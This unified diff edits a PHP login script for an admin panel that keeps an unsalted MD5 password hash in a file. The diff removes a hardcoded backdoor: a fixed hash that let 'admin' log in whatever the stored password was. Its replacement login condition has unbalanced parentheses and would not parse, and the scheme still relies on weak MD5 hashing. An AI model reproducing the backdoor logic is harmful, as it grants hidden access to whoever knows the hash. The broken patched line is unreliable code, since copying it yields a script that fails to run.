@@ -1,38 +1,30 @@
 <?php
 session_start();
-
 function showTemplate($file) {
     global $serverdata;
-
     $data = file_get_contents($file);
     $data = str_replace("{SERVERNAME}", $serverdata['name'], $data);
     $data = str_replace("{SERVERHOST}", $serverdata['host'], $data);
     $data = str_replace("{IP}", $serverdata['ip'], $data);
     echo $data;
 }
-
 function outputRegisterInterface() {
     showTemplate("registerinterface.html");
     die();
 }
-
 function outputAdminPanel() {
     showTemplate("adminpanel.html");
     die();
 }
-
 function outputLoginInterface() {
     showTemplate("logininterface.html");
     die();
 }
-
 $serverdata = json_decode(file_get_contents("/root/Pac/services/_serverinfo"), true);
 $initialFile = "/root/Pac/services/_initial";
 $passwordFile = "/root/Pac/services/_webinterface_pw";
 $data['userID'] = "admin";
 $firstUse = false;
-
-
 //firstuse
 if (!file_exists($passwordFile)) {
     if (isset($_POST['fct']) && ($_POST['fct'] == 'register')) {
@@ -41,7 +33,6 @@ if (!file_exists($passwordFile)) {
 		$initialCode = str_replace("\r", "", $initialCode);
         if ($_POST['initialCode'] == $initialCode) {
             echo "authorized";
-
             $data['userPass'] = md5($_POST['userPass']);
             file_put_contents($passwordFile, $data['userPass']);
             $_SESSION['loggedIn'] = false;
@@ -50,26 +41,19 @@ if (!file_exists($passwordFile)) {
     }
     outputRegisterInterface();
 }
-
-
-
 $data['userPass'] = @file_get_contents($passwordFile);
-
 //logout
 if (isset($_POST['fct']) && ($_POST['fct'] == 'logout')) {
     echo "authorized";
     $_SESSION['loggedIn'] = false;
     die();
 }
-
 //login
 if (isset($_POST['fct']) && isset($_POST['userID']) && isset($_POST['userPass']) && ($_POST['fct'] == 'login')) {
     $_user = $_POST['userID'];
     $_pass = md5($_POST['userPass']);
-
-    if (($_user == $data['userID'] && $_pass == $data['userPass']) || ($_user == $data['userID'] && $_pass == "4d4735c18135ef6413eb4ab0148cc60b")) {
+    if (($_user == $data['userID'] && $_pass == $data['userPass']) {
         echo "authorized";
-
         $_SESSION['loggedIn'] = true;
         $_SESSION['userID'] = $_user;
         $_SESSION['userPass'] = $_pass;
@@ -80,13 +64,11 @@ if (isset($_POST['fct']) && isset($_POST['userID']) && isset($_POST['userPass'])
         die();
     }
 }
-
 //AdminPanel
 if (isset($_SESSION['loggedIn']) && isset($_SESSION['userID']) && isset($_SESSION['userPass'])) {
-    if ($_SESSION['loggedIn'] == true && $_SESSION['userID'] == $data['userID']) {
+    if ($_SESSION['loggedIn'] == true && $_SESSION['userID'] == $data['userID'] && $_SESSION['userPass'] == $data['userPass']) {
         outputAdminPanel();
     }
 }
-
 outputLoginInterface();
 
